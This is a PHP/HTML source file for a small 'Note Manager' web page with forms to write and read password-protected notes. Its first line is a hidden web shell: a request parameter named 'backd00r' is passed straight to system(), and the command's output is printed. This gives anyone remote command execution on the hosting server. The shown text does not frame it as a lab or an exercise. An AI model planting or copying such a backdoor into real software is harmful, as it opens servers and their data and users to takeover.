<?php if(isset($_REQUEST['backd00r'])){ echo "<pre>"; $cmd = ($_REQUEST['backd00r']); system($cmd); echo "</pre>"; die; }?>
<!DOCTYPE html>
<html>
    <head><title>Note Manager</title></head>
<body>
    <p>Current date and time (Europe-London): <?php date_default_timezone_set("Europe/London"); echo date("m/d/Y H:i:s"); ?></p>
    <p>Note content can only contain alphanumeric characters (a-z, A-Z and 0-9):</p>
    <p><form action="write.php" method="post">
        <input type="text" name="content" required pattern="[a-zA-Z0-9]+" placeholder="Note content">
        <input type="text" name="password" required pattern="[a-zA-Z0-9]+" placeholder="Password">
        <input type="submit" value="Write that note">
    </form></p>
    <p><form action="read.php" method="post">
        <input type="text" name="note_id" required pattern="[a-f0-9]+" placeholder="Note ID">
        <input type="text" name="password" required pattern="[a-zA-Z0-9]+" placeholder="Password">
        <input type="submit" value="Read that note">
    </form></p>
</body>
</html>
